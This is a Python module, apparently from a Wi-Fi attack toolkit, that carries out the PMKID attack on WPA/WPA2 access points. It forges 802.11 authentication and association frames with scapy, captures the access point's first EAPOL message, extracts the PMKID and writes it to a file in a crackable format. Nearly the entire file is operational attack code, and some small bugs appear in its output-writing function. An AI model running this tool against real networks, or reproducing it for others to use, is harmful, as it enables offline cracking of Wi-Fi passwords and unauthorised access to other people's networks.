import os
import re
import sys
import time
import curses
import random
import binascii
import threading
import subprocess
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.utils    import PcapWriter
from scapy.packet   import Raw
from scapy.arch     import get_if_raw_hwaddr as HWADDR
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.dot11 import Dot11Auth
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.dot11 import Dot11AssoResp
from scapy.layers.dot11 import Dot11EltRates
from scapy.layers.dot11 import RadioTapExtendedPresenceMask
from scapy.layers.dot11 import Dot11EltCountryConstraintTriplet
from scapy.layers.dot11 import RSNCipherSuite
from scapy.layers.dot11 import AKMSuite
from scapy.layers.dot11 import Dot11EltVendorSpecific
from scapy.layers.eap   import EAPOL

pull = PULL()

class Dot11EltEssid(Dot11Elt):

	def mysummary(self):
		if self.ID == 0:
			ssid = self.info
			return "SSID=%s" % ssid, [Dot11]
		else:
			return ""

class PMKID:

	__PACKET = None

	__FNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
	__FMIC   = "00000000000000000000000000000000"
	__FPMKID = '00000000000000000000000000000000'

	__AUTHRUNNER = True
	__AUTHSTATUS = True

	__ASSORUNNER = True
	__ASSOSTATUS = True

	__EAPOSTATUS = True

	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname, pauth, passo, dauth, dasso):
		self.interface  = iface
		self.bssid      = bssid
		self.essid      = essid
		self.channel    = channel
		self.power      = power
		self.device     = device
		self.encryption = encryption
		self.cipher     = cipher
		self.auth       = auth
		self.stations   = stations
		self.beacon     = beacon
		self.output     = self.output(outfname)
		self.pauth      = pauth
		self.passo      = passo
		self.dauth      = dauth
		self.dasso      = dasso

	def output(self, fl):
		if fl:
			if fl.endswith(".pmkid"):
				return fl
			elif fl.endswith("."):
				return (fl + "pmkid")
			else:
				return (fl + ".pmkid")
		else:
			return False

	def extract_sn_rc(self, pkt):
		try:
			sn = pkt.getlayer(Dot11FCS).addr2
			rc = pkt.getlayer(Dot11FCS).addr1
		except:
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1

		return (sn, rc)

	def channeler(self):
		ch = str(self.channel)
		subprocess.call(['iwconfig', self.interface, 'channel', ch])

	def get_my_address(self):
		retval = HWADDR(self.interface)
		family = retval[0]
		hwaddr = retval[1]
		hwaddr = binascii.hexlify(hwaddr).decode()
		hwaddr = ':'.join(hwaddr[i:i+2] for i in range(0,12,2))
		return hwaddr

	def forge_auth_frame(self, ap, cl):
		pkt = RadioTap() / Dot11(
				type=0,
				subtype=11,
				addr1=ap,
				addr2=cl,
				addr3=ap
			) / Dot11Auth(
				seqnum=1,
			)

		return pkt

	def forge_asso_frame(self, ap, cl):
		cap = self.beacon.getlayer(Dot11Beacon).cap

		forger = self.beacon.copy()
		payload = forger.getlayer(3).payload
		payload.getlayer(0).remove_payload()

		pkt = RadioTap() / Dot11(
							subtype=0,
							type=0,
							addr1=ap,
							addr2=cl,
							addr3=ap,
						) / Dot11AssoReq(cap="short-slot+ESS+privacy+short-preamble", listen_interval=0x00a) / payload

		extlayers = []
		finlayers = []
		pktslayer = []
		eltlayers = self.beacon.getlayer(Dot11Elt)

		counter = 0
		possibilities = (1, 50, 48, 45, 127, 59, 221)
		layer = eltlayers.getlayer(counter)
		while layer:
			if hasattr(layer, "ID"):
				identifier = getattr(layer, "ID")
				if identifier in possibilities:

					clayer = layer.copy()
					clayer[0].remove_payload()
					extlayers.append(clayer)

			counter += 1
			layer = eltlayers.getlayer(counter)

		counter = 1
		layer = eltlayers.getlayer(counter)
		while layer:
			if hasattr(layer, "ID"):
				clayer = layer.copy()
				clayer[0].remove_payload()
				finlayers.append(clayer)

			counter += 1
			layer = eltlayers.getlayer(counter)

		parta = pkt.copy()
		partb = pkt.copy()

		for layer in extlayers:
			parta /= layer
			
		for n in range(5):
			pktslayer.append(parta)

		for layer in finlayers:
			partb /= layer
			pktslayer.append(partb)

		return pktslayer

	def auth_sender(self, pkt):
		while self.__AUTHRUNNER:
			if self.__AUTHRUNNER:
				pull.print(
					"*",
					"Authentication Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						packets=pull.RED+str(self.pauth)+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.YELLOW
				)

			sendp(
				pkt,
				iface=self.interface,
				count=self.pauth,
				inter=self.dauth,
				verbose=False
			)

		self.__AUTHSTATUS = False

	def auth_receiver(self, pkt):
		if pkt.haslayer(Dot11Auth):
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]

			status = pkt.getlayer(Dot11Auth).status

			if sn == self.bssid and rc == self.myaddress and pkt.getlayer(Dot11Auth).seqnum == 2 and status == 0:
				pull.print(
					"$" if status == 0 else "-",
					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=pull.GREEN+"Confirmed"+pull.END if status == 0 else pull.RED+"Denied"+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.GREEN if status == 0 else pull.RED
				)
				raise KeyboardInterrupt()

	def asso_sender(self, pkts):
		while self.__ASSORUNNER:
			for pkt in pkts:
				if self.__ASSORUNNER:
					pull.print(
						"*",
						"Association Req. Stance [{packets}-{length}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
							packets=pull.RED+str(self.passo)+pull.END,
							length=pull.RED+str(len(pkt))+pull.END,
							apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
							ap=self.bssid.upper(),
							stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
							sta=self.myaddress.upper(),
							essid=pull.YELLOW+self.essid+pull.END
						),
						"\r",
						pull.YELLOW
					)

					sendp(
						pkt,
						iface=self.interface,
						count=self.passo,
						inter=self.dasso,
						verbose=False
					)

		self.__ASSOSTATUS = False

	def asso_receiver(self, pkt):
		if pkt.haslayer(Dot11AssoResp):
			status = pkt.getlayer(Dot11AssoResp).status
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]

			if sn == self.bssid and rc == self.myaddress:
				pull.print(
					"$" if status == 0 else "-",
					"Association Res. [{status}-{response}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=(pull.GREEN+"Confirmed"+pull.END if status == 0 else pull.RED+"Denied"+pull.END),
						response=(pull.GREEN+"0"+pull.END if status == 0 else pull.RED+str(status)+pull.END),
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.GREEN if status == 0 else pull.RED
				)

		capture = self.eapol_receiver(pkt)
		if capture:
			raise KeyboardInterrupt()

	def eapol_receiver(self, pkt):
		if pkt.haslayer(EAPOL):
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]
			nn     = binascii.hexlify(pkt.getlayer(Raw).load)[26:90].decode()
			mc     = binascii.hexlify(pkt.getlayer(Raw).load)[154:186].decode()

			if sn == self.bssid and rc == self.myaddress and nn != self.__FNONCE and mc == self.__FMIC:
				self.__PACKET = pkt
				pull.print(
					"$",
					"EAPOLT (1 of 4). [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=pull.GREEN+"Confirmed"+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					"\r",
					pull.GREEN
				)
				return True

		return None

	def extract(self, pkt):
		pmk = binascii.hexlify(pkt.getlayer(Raw).load)[202:234].decode()

		if pmk != self.__FPMKID:
			pull.print(
					"*",
					"Extracted. Vulnerable! PMKID [{pmkid}]".format(
						pmkid=pmk
					),
					pull.DARKCYAN
				)
			return pmk
		else:
			pull.print(
					"-",
					"Target is not Vulnerable to PMKID Attack. Received Empty PMKID payload",
					pull.RED
				)
			return None

	def write(self, pmkid):
		if self.output:
			fl = open(self.output, "w")
			fl.write(
				"{pmkid}*{apmac}*{clmac}*{essid}\n".format(
					pmkid=pmkid,
					apmac=self.bssid.replace(":", ""),
					clmac=self.myaddress.replace(":", ""),
					essid=binascii.hexlify(self.essid)
				)
			)

			pull.print(
				"*",
				"Captured. FL [{output}]".format(
					self.output
				)
			)

	def engage(self):
		self.myaddress  = self.get_my_address()
		auth_frame = self.forge_auth_frame( self.bssid, self.myaddress )
		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )


		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.auth_receiver)

		self.__AUTHRUNNER = False
		while self.__AUTHSTATUS:
			pass

		t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.asso_receiver)

		pull.print(
			"*",
			"Stopping Services. Captured EAPOL",
			pull.DARKCYAN
		)

		self.__ASSORUNNER = False
		while self.__ASSOSTATUS:
			pass

		pmk = self.extract( self.__PACKET )

		self.write( pmk )

